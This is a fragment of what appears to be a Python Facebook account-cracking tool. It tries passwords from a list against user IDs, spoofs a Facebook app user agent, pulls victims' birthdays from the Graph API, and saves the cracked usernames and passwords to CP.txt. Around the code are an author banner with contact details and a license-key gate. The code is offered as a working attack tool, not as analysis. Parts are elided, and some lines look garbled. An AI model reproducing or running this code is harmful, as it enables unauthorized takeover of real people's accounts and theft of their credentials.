		...
		for pw in _sempak_:
			...
			if "access_token" in p:
				...
				try:
					...
					IMTIAZ_AKING('\r\033[1;91m[Checkpoint-AKING] %s | %s â€¢ %s %s %s%s      '%(user,pw,day,month,year,tahun(user)))
		...
		for pw in _sempak_:
			...
			if 'c_user' in ses.cookies.get_dict():
				...
				try:
					...
					cp_ttl = Prof_IMtiaz('https://graph.facebook.com/%s?access_token=%s'%(user,token)).json()['birthday']
					month, day, year = cp_ttl.split('/')
					month = bulan_ttl[month].IMTIAZ_AKING('\r\033[1;91m[Checkpoint-AKING] %s | %s â€¢ %s %s %s%s      ' % (user,pw,day,month,year,tahun(user)))
					wrt = '%s - %s - %s %s %s%s' % (user,pw,day,month,year,tahun(user))
					cp.append(wrt)
					open('CP.txt','a').write('%s\n' % wrt)
					break
...
imtiazak_ua_samsung = 'Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T; wv) AppleWebKit/537.36 (KHTML, like Gecko) m
ersion/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/35.0.0.48.273;]'
...
| |  | |_   _|  \/  |  ____| |    |___ \__ \         | |__| | | | | \  / | |__  | |      __) | ) |
|  __  | | | | |\/| |  __| | |     |__ < / /         | |  | |_| |_| |  | | |____| |____ ___) / /_
|_|  |_|_____|_|  |_|______|______|____/____|
 [*]=============================================
    Author   : KING-HIMEL 32
    Facebook : https://facebook.com/mdnx.himel32
    Team     : 32
    Connect  : 01601161609
 [*]=============================================
...
if key2 in b:
    ...
    print("Your key  : "+key2)
    print("\n\t\tContact Admin ")
    os.system('xdg-open https://www.facebook.com/profile.php?id=100088586432466&mibextid=ZbWKwL')
    exit()
